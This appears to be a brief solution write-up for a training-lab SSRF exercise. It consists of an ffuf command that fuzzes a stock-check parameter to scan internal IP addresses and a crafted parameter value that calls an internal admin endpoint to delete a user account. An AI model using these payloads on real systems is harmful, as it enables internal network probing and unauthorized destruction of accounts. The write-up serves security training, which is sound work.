# Lab: Basic SSRF against another back-end system
Solution: 
- FUZZ the IP address with ffuf
- Make a wordlist numzz containing numbers from 1-155
```sh
ffuf -X POST -u https://acaf1fba1efc1a50c193748d009e007c.web-security-academy.net/product/stock -d "stockApi=http://192.168.0.FUZZ:8080/admin" -w ./numzz
```
- Change the stockApi parameter to
```js
stockApi=http://192.168.0.206:8080/admin/delete?username=carlos
```